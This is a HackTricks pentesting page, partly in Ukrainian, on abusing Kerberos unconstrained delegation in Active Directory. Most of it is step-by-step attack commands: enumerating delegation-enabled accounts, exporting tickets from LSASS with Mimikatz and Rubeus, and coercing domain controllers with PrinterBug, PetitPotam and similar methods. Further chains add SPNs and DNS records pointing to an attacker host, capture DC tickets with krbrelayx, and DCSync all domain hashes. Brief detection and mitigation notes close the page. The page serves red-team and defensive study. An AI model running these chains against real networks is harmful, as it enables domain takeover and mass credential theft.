# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Це функція, яку Domain Administrator може встановити для будь-якого **Computer** всередині domain. Після цього, щоразу, коли **user logins** на Computer, **копія TGT** цього user буде **надіслана всередині TGS**, наданого DC, і **збережена в memory в LSASS**. Тож, якщо у вас є Administrator privileges на машині, ви зможете **dump the tickets і impersonate the users** на будь-якій машині.

Тому якщо domain admin logins на Computer із увімкненою функцією "Unconstrained Delegation", і у вас є local admin privileges на цій машині, ви зможете dump the ticket і impersonate Domain Admin будь-де (domain privesc).

Ви можете **знайти Computer objects з цим атрибутом**, перевіривши, чи атрибут [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) містить [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Це можна зробити за допомогою LDAP filter ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, і саме це робить powerview:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Load the ticket of Administrator (or victim user) in memory with **Mimikatz** or **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
More info: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**More information about Unconstrained delegation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

If an attacker is able to **compromise a computer allowed for "Unconstrained Delegation"**, he could **trick** a **Print server** to **automatically login** against it **saving a TGT** in the memory of the server.\
Then, the attacker could perform a **Pass the Ticket attack to impersonate** the user Print server computer account.

To make a print server login against any machine you can use [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Якщо TGT отримано від domain controller, ви можете виконати [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) і отримати всі хеші з DC.\
[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Знайдіть тут інші способи **примусити автентифікацію:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Будь-який інший coercion primitive, який змушує victim автентифікуватися через **Kerberos** на ваш host з unconstrained-delegation, теж підходить. У сучасних environments це часто означає заміну класичного PrinterBug flow на **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** або coercion на основі **WebClient/WebDAV** залежно від того, яка RPC surface доступна.

### Abusing a user/service account with unconstrained delegation

Unconstrained delegation **не обмежується computer objects**. **User/service account** також може бути налаштований як `TRUSTED_FOR_DELEGATION`. У такому сценарії практична вимога полягає в тому, щоб account отримував Kerberos service tickets для **SPN, який йому належить**.

Це приводить до 2 дуже поширених offensive path:

1. Ви компрометуєте password/hash **user account** з unconstrained-delegation, а потім **додаєте SPN** до цього ж account.
2. Account уже має один або більше SPN, але один із них вказує на **застарілий/виведений з експлуатації hostname**; відновлення відсутнього **DNS A record** достатньо, щоб перехопити authentication flow без зміни набору SPN.

Minimal Linux flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notes:

- Це особливо корисно, коли unconstrained principal є **service account** і в вас є лише його credentials, а не code execution на joined host.
- Якщо target user уже має **stale SPN**, відтворення відповідного **DNS record** може бути менш noisy, ніж запис нового SPN у AD.
- Recent Linux-centric tradecraft використовує `addspn.py`, `dnstool.py`, `krbrelayx.py` і один coercion primitive; вам не потрібно торкатися Windows host, щоб завершити chain.

### Abusing Unconstrained Delegation with an attacker-created computer

Modern domains often have `MachineAccountQuota > 0` (default 10), allowing any authenticated principal to create up to N computer objects. If you also hold the `SeEnableDelegationPrivilege` token privilege (or equivalent rights), you can set the newly created computer to be trusted for unconstrained delegation and harvest inbound TGTs from privileged systems.

High-level flow:

1) Create a computer you control
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Зробіть fake hostname таким, що резолвиться всередині domain
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Увімкніть Unconstrained Delegation на комп’ютері, контрольованому атакувальником
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Чому це працює: with unconstrained delegation, LSA на computer з увімкненим delegation кешує inbound TGTs. Якщо ти змусиш DC або privileged server автентифікуватися на твій fake host, його machine TGT буде збережено і can be exported.

4) Start krbrelayx in export mode and prepare the Kerberos material
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Примусьте аутентифікацію з DC/servers до вашого fake host
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx збереже файли ccache, коли машина автентифікується, наприклад:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Використайте захоплений DC machine TGT, щоб виконати DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notes and requirements:

- `MachineAccountQuota > 0` enables unprivileged computer creation; otherwise you need explicit rights.
- Setting `TRUSTED_FOR_DELEGATION` on a computer requires `SeEnableDelegationPrivilege` (or domain admin).
- Ensure name resolution to your fake host (DNS A record) so the DC can reach it by FQDN.
- Coercion requires a viable vector (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, etc.). Disable these on DCs if possible.
- If the victim account is marked as **"Account is sensitive and cannot be delegated"** or is a member of **Protected Users**, the forwarded TGT will not be included in the service ticket, so this chain won't yield a reusable TGT.
- If **Credential Guard** is enabled on the authenticating client/server, Windows blocks **Kerberos unconstrained delegation**, which can make otherwise valid coercion paths fail from an operator perspective.

Detection and hardening ideas:

- Alert on Event ID 4741 (computer account created) and 4742/4738 (computer/user account changed) when UAC `TRUSTED_FOR_DELEGATION` is set.
- Monitor for unusual DNS A-record additions in the domain zone.
- Watch for spikes in 4768/4769 from unexpected hosts and DC-authentications to non-DC hosts.
- Restrict `SeEnableDelegationPrivilege` to a minimal set, set `MachineAccountQuota=0` where feasible, and disable Print Spooler on DCs. Enforce LDAP signing and channel binding.

### Mitigation

- Limit DA/Admin logins to specific services
- Set "Account is sensitive and cannot be delegated" for privileged accounts.

## References

- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- krbrelayx: https://github.com/dirkjanm/krbrelayx
- Impacket addcomputer.py: https://github.com/fortra/impacket
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
- Praetorian – Unconstrained Delegation in Active Directory: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
- Microsoft Learn – Protected Users Security Group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

{{#include ../../banners/hacktricks-training.md}}
